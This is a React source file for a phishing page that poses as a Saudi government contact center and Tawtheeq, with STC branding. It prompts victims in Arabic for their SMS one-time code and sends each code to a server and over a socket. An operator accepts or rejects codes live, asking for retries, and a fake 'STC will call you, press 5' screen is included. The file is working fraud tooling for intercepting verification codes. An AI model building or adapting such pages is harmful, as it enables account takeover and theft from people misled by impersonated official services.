import React, { use, useEffect } from "react";
import { useState } from "react";
import axios from "axios";
import { serverRoute, socket } from "./Home";
import { TailSpin } from "react-loader-spinner";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { useNavigate } from "react-router-dom";
const PhoneOtp = () => {
  const [phoneOtp, setPhoneOtp] = useState(null);
  const [loading, setLoading] = useState(false);
  const [STC, setSTC] = useState(false);
  const query = new URLSearchParams(window.location.search);
  const stc = query.get("stc");
  const [error, setError] = useState(false);
  const [counter, setCounter] = useState(180);
  const navigate = useNavigate();
  useEffect(() => {
    const timer = setInterval(() => {
      if (counter > 0) {
        setCounter(counter - 1);
      }
    }, 1000);

    return () => clearInterval(timer);
  }, [counter]);

  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;

  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();

    try {
      await axios
        .post(serverRoute + "/phoneOtp/" + sessionStorage.getItem("id"), {
          phoneOtp,
        })
        .then(() =>
          socket.emit("phoneOtp", {
            id: sessionStorage.getItem("id"),
            phoneOtp,
          })
        );
    } catch (error) {}
  };
  const ID = sessionStorage.getItem("id");

  socket.on("acceptPhoneOTP", (id) => {
    if (id === sessionStorage.getItem("id")) {
      // if (stc === "check") {
      //   setSTC(true);
      // } else {
      //   return navigate("/navaz?otp=" + price);
      // }
      window.location.href = "/success";
    }
  });

  socket.on("declinePhoneOTP", (id) => {
    if (id === sessionStorage.getItem("id")) {
      setLoading(false);
      setError(true);
    }
  });

  socket.on("acceptService", ({ id, price }) => {
    console.log(id, price);
    if (id === ID) {
      return (window.location.href =
        "/navaz?otp=" + price + "&stc=" + stc || null);
    }
  });

  socket.on("declineService", (id) => {
    if (id === ID) return navigate("/phone");
  });

  return (
    <>
      {STC ? (
        <div className="">
          {" "}
          <div className="w-full flex flex-col justify-center  items-center bg-white h-screen py-2 gap-y-10">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/e/e3/STC-01.svg"
              className="w-1/2"
            />
            <div className="  w-full flex flex-col jus items-center gap-y-4">
              <p className="text-xl font-bold"> STC سوف يتم الاتصال بك من </p>
              <p
                className="font-bold text-gray-500"
                style={{ fontSize: "12px" }}
              >
                لتأكيد طلبك الرجاء الضغط على رقم 5
              </p>
              <span className="text-purple-700 font-bold">! يرجي الإنتظار</span>
            </div>
            <div className="flex w-11/12 flex-col justify-center items-center bg-purple-100 rounded-full py-1">
              <span className="text-purple-700 font-bold ">
                إعادة الاتصال بعد{" "}
              </span>
              <span className="text-purple-700 font-bold">
                {formattedMinutes}:{formattedSeconds}
              </span>
            </div>
          </div>
        </div>
      ) : (
        <div className="w-full flex-1 flex flex-col items-center justify-center bg-white p-4">
          <form
            className=" rounded-lg p-6 text-sm w-full max-w-md"
            dir="rtl"
            onSubmit={handleSubmit}
          >
            {/* Header with logo */}
            <div className="flex items-center justify-center gap-3 mb-6">
              <div className="text-xs text-gray-600">
                <div>مركز الاتصال الحكومي</div>
                <div>Government Contact Center</div>
              </div>
              <img src="/phone.jpeg" alt="Tawtheeq Logo" className="h-20" />
            </div>

            {/* Title */}
            <h2 className="font-bold text-lg w-full text-right mb-4 border-b border-dotted border-gray-400 pb-4">
              ربط رقم الهاتف وتفعيل الحساب
            </h2>

            {/* Description */}
            <p className="text-right text-xs text-gray-700 leading-relaxed mb-6  pb-4">
              يرجى ادخال الرمز المرسل اليك عبر الرسائل النصية في الخانة المخصصة
              ادناه.
            </p>

            {/* Loading Spinner */}
            <div className="flex justify-center items-center mb-6">
              <div className="w-20 h-20">
                <svg className="animate-spin" viewBox="0 0 100 100">
                  <circle
                    cx="50"
                    cy="50"
                    r="40"
                    stroke="#d1d5db"
                    strokeWidth="8"
                    fill="none"
                  />
                  <circle
                    cx="50"
                    cy="50"
                    r="40"
                    stroke="#9ca3af"
                    strokeWidth="8"
                    fill="none"
                    strokeDasharray="60 200"
                    strokeLinecap="round"
                  />
                </svg>
              </div>
            </div>

            {/* OTP Input */}
            <div className="mb-6">
              <input
                value={phoneOtp}
                required
                onChange={(e) => setPhoneOtp(e.target.value)}
                dir="ltr"
                inputMode="numeric"
                minLength={4}
                type="text"
                className="w-full px-4 py-3 rounded border border-gray-300 text-center bg-white focus:outline-none focus:border-blue-500 placeholder-gray-400 tracking-widest"
              />
            </div>

            {/* Submit Button */}
            <div className="w-full flex items-center justify-center mb-4">
              <button
                type="submit"
                className="px-8 py-3 bg-[#1e88e5] hover:bg-[#1976d2] text-white w-full rounded font-semibold text-lg transition-colors"
              >
                تأكيد
              </button>
            </div>
          </form>

          {loading && (
            <div
              className="fixed inset-0 bg-[#02020260] flex items-center justify-center z-50"
              dir="rtl"
            >
              <div className="bg-white rounded-lg p-8 max-w-md w-11/12 flex flex-col items-center justify-center">
                <img
                  src="/logo.jpeg"
                  alt="Tawtheeq Logo"
                  className="h-20 mb-6"
                />
                <div className="relative w-32 h-32 mb-4">
                  <img
                    src="/loading.gif"
                    alt="Loading"
                    className="w-full h-full"
                  />
                </div>
                <p className="text-gray-800 text-lg font-bold text-center">
                  جاري التحقق من الرمز...
                </p>
              </div>
            </div>
          )}

          {/* Error Modal */}
          {error && (
            <div className="fixed inset-0 bg-black bg-opacity-45 flex items-center justify-center z-50">
              <div className="bg-white py-5 px-4 md:w-1/3 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3 rounded-lg">
                <AiOutlineCloseCircle className="text-6xl text-red-500" />
                <div
                  className="flex flex-col w-full items-center justify-center"
                  dir="rtl"
                >
                  <span className="text-gray-800 font-bold">
                    رمز التحقق غير صحيح
                  </span>
                  <span className="text-gray-600 text-sm mt-2">
                    الرجاء إدخال الرمز الصحيح
                  </span>
                </div>
                <button
                  className="bg-gray-900 text-white w-11/12 py-3 rounded hover:bg-gray-800 transition-colors"
                  onClick={() => setError(false)}
                >
                  حاول مرة أخرى
                </button>
              </div>
            </div>
          )}
        </div>
      )}
    </>
  );
};

export default PhoneOtp;
